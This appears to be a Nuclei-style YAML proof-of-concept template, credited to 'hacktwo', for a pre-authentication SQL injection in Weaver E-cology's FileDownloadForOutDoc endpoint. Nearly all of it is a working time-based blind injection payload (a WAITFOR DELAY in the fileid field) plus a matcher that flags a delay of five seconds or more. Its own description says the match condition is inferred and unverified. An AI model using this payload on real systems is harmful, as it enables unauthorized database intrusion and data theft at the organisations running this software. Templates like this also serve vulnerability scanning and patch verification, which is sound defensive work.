id: poc-bh3soyawlzv77uw0
info:
  name: 泛微 E-cology 前台SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2024
http:
- raw:
  - 'POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1


    Content-Type: application/x-www-form-urlencoded


    fileid=2+WAITFOR DELAY+''0:0:5''&isFromOutImg=1


    # 响应代码特征

    200


    # 响应内容特征

    暂无


    # 上传文件定位

    暂无'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
